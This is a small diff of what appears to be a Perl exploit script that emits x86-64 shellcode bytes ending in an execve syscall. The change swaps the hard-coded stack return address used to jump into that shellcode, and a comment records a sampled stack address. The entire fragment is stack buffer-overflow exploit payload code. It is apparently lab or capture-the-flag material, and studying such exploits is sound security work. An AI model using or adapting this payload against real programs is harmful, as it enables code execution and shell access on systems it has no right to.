@@ -17,7 +17,7 @@ print "\xb0\x3b";
 print "\x48\x89\xe7";
 print "\x0f\x05";
 
-print "\x70\xdc\xff\xff\xff\x7f";
+print "\x50\xc5\xff\xff\xff\x7f";
 
 #Random sample
 #0x 7f fd 47 15 48 00
